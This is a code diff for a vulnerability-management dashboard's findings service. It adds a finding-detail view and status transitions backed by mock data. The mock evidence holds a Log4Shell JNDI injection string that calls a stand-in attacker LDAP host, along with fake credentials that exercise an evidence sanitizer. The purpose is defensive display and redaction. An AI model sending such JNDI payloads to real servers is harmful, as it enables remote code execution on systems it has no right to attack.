@@ -1,11 +1,14 @@
 import { request } from "../../services/api";
+import { sanitizeEvidence } from "./evidenceSanitizer";
 import type {
   BatchUpdatePayload,
   BatchUpdateResponse,
   Finding,
+  FindingDetail,
   FindingsFilterParams,
   FindingsListResponse,
   FindingSeverity,
+  FindingStatus,
 } from "./types";
 
 const severityWeights: Record<FindingSeverity, number> = {
@@ -385,6 +388,202 @@ export async function exportFindings(
   ]);
 
   return [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
+}
+
+/**
+ * Fetch detailed finding by ID including risk explainability, sanitized evidence, and history
+ */
+export async function getFindingDetail(id: string): Promise<FindingDetail> {
+  try {
+    const res = await request<FindingDetail>(`/findings/${id}`);
+    if (res && res.id) {
+      return res;
+    }
+  } catch {
+    // Fall back to mock detail generator
+  }
+
+  const baseFinding =
+    mockFindingsStore.find((f) => f.id === id) || mockFindingsStore[0];
+
+  const baseCvss = baseFinding.cvssScore ?? 8.5;
+  const assetCriticality = 1.2;
+  const confidenceFactor = 0.95;
+  const exposureFactor = 1.05;
+  const composite = Math.min(
+    10.0,
+    parseFloat((baseCvss * assetCriticality * confidenceFactor * exposureFactor * 0.8).toFixed(1))
+  );
+
+  const rawSampleRequest = `POST /auth/ldap HTTP/1.1\r\nHost: ${baseFinding.affectedEndpoint.replace("https://", "").split("/")[0]}\r\nUser-Agent: \${jndi:ldap://attacker.dns.example.com/a}\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\r\nCookie: sessionid=sess_9823749817234\r\nContent-Type: application/json\r\n\r\n{"username":"admin","password":"SuperSecretPassword123!"}`;
+
+  const rawSampleResponse = `HTTP/1.1 500 Internal Server Error\r\nServer: nginx/1.24.0\r\nContent-Type: application/json; charset=utf-8\r\n\r\n{"error":"Error resolving JNDI resource ldap://attacker.dns.example.com/a: Connection timed out","correlationId":"req-98fbc1-2026"}`;
+
+  const sanitizedReq = sanitizeEvidence(rawSampleRequest);
+  const sanitizedRes = sanitizeEvidence(rawSampleResponse);
+
+  return {
+    ...baseFinding,
+    remediationSlaDays: baseFinding.severity === "CRITICAL" ? 7 : 30,
+    dueDate: "2026-11-10T00:00:00Z",
+    isSlaBreached: false,
+    riskExplainability: {
+      compositeScore: composite,
+      baseCvss,
+      assetCriticality,
+      confidenceFactor,
+      exposureFactor,
+      formula: "Composite Risk = min(10.0, CVSS × Asset Criticality × Scanner Confidence × Exposure)",
+      rationale:
+        "The asset is in the staging VPC with partial external reachability. High confidence scanner match with observed network egress triggers criticality weight adjustment.",
+      contributingFactors: [
+        {
+          factor: "CVSS v3.1 Base Score",
+          weight: baseCvss.toFixed(1),
+          impact: "Primary severity metric based on remote exploitability and impact.",
+        },
+        {
+          factor: "Asset Criticality Multiplier",
+          weight: `${assetCriticality}x`,
+          impact: "Tier-1 internal staging API service processing authenticated requests.",
+        },
+        {
+          factor: "Detection Confidence Factor",
+          weight: `${Math.round(confidenceFactor * 100)}%`,
+          impact: "Template verification confirmed vulnerable outbound callback.",
+        },
+        {
+          factor: "Environmental Exposure",
+          weight: `${exposureFactor}x`,
+          impact: "Service endpoint accessible from external VPN perimeter.",
+        },
+      ],
+    },
+    evidence: [
+      {
+        id: "ev-01",
+        findingId: baseFinding.id,
+        title: "HTTP Proof of Concept Request",
+        evidenceType: "HTTP_REQUEST",
+        rawPayload: rawSampleRequest,
+        sanitizedPayload: sanitizedReq.sanitized,
+        isRedacted: sanitizedReq.hasRedactions,
+        sha256: "4a8b79e1c312784d123498765abcdef0123456789abcdef0123456789abcdef0",
+        timestamp: baseFinding.lastSeenAt,
+      },
+      {
+        id: "ev-02",
+        findingId: baseFinding.id,
+        title: "HTTP Target Response",
+        evidenceType: "HTTP_RESPONSE",
+        rawPayload: rawSampleResponse,
+        sanitizedPayload: sanitizedRes.sanitized,
+        isRedacted: sanitizedRes.hasRedactions,
+        sha256: "9f2d1e8c7b6a1234876543210abcdef0123456789abcdef0123456789abcdef0",
+        timestamp: baseFinding.lastSeenAt,
+      },
+      {
+        id: "ev-03",
+        findingId: baseFinding.id,
+        title: "Raw Nuclei Template Execution Output",
+        evidenceType: "SCANNER_RAW",
+        rawPayload: `[2026-11-03 08:30:00] [CVE-2021-44228:log4j-rce] [http] [critical] https://api.staging.kelvin-sec.internal:8443/auth/ldap [{"extracted-results": ["ldap://attacker.dns.example.com/a"]}]`,
+        sanitizedPayload: `[2026-11-03 08:30:00] [CVE-2021-44228:log4j-rce] [http] [critical] https://api.staging.kelvin-sec.internal:8443/auth/ldap [{"extracted-results": ["[REDACTED_CALLBACK]"]}]`,
+        isRedacted: true,
+        sha256: "7c8d9e0f1a2b34567890abcdef0123456789abcdef0123456789abcdef012345",
+        timestamp: baseFinding.lastSeenAt,
+      },
+    ],
+    observations: [
+      {
+        id: "obs-101",
+        assessmentId: "asm-01",
+        assessmentTitle: "Weekly Comprehensive Security Sweep #42",
+        scanner: baseFinding.scanner,
+        observedAt: baseFinding.lastSeenAt,
+        status: baseFinding.status,
+        evidenceCount: 3,
+      },
+      {
+        id: "obs-100",
+        assessmentId: "asm-00",
+        assessmentTitle: "Baseline External Perimeter Assessment",
+        scanner: baseFinding.scanner,
+        observedAt: baseFinding.firstSeenAt,
+        status: "OPEN",
+        evidenceCount: 1,
+      },
+    ],
+    auditTrail: [
+      {
+        id: "aud-02",
+        timestamp: baseFinding.lastSeenAt,
+        actor: "scanner:kelvin-worker-02",
+        action: "Vulnerability Re-verified",
+        fromStatus: "OPEN",
+        toStatus: baseFinding.status,
+        justification: "Automated scan confirmed vulnerable signature persists.",
+      },
+      {
+        id: "aud-01",
+        timestamp: baseFinding.firstSeenAt,
+        actor: "scanner:kelvin-worker-01",
+        action: "Finding Ingested",
+        toStatus: "OPEN",
+        justification: "Initial detection recorded during scheduled perimeter sweep.",
+      },
+    ],
+  };
+}
+
+/**
+ * Transition finding status with audit trail recording
+ */
+export async function transitionFindingStatus(
+  id: string,
+  newStatus: FindingStatus,
+  justification: string,
+  assignee?: string,
+  dueDate?: string
+): Promise<FindingDetail> {
+  try {
+    const res = await request<FindingDetail>(`/findings/${id}/transition`, {
+      method: "POST",
+      body: JSON.stringify({ status: newStatus, justification, assignee, dueDate }),
+    });
+    if (res && res.id) {
+      return res;
+    }
+  } catch {
+    // Apply to mock store
+  }
+
+  mockFindingsStore = mockFindingsStore.map((f) =>
+    f.id === id
+      ? {
+          ...f,
+          status: newStatus,
+          assignee: assignee ?? f.assignee,
+        }
+      : f
+  );
+
+  const detail = await getFindingDetail(id);
+  detail.status = newStatus;
+  if (assignee) detail.assignee = assignee;
+  if (dueDate) detail.dueDate = dueDate;
+
+  detail.auditTrail.unshift({
+    id: `aud-${Date.now()}`,
+    timestamp: new Date().toISOString(),
+    actor: "current-user@kelvin.io",
+    action: `Status transitioned to ${newStatus}`,
+    fromStatus: detail.status,
+    toStatus: newStatus,
+    justification,
+  });
+
+  return detail;
 }
 
 export function resetMockFindings(): void {
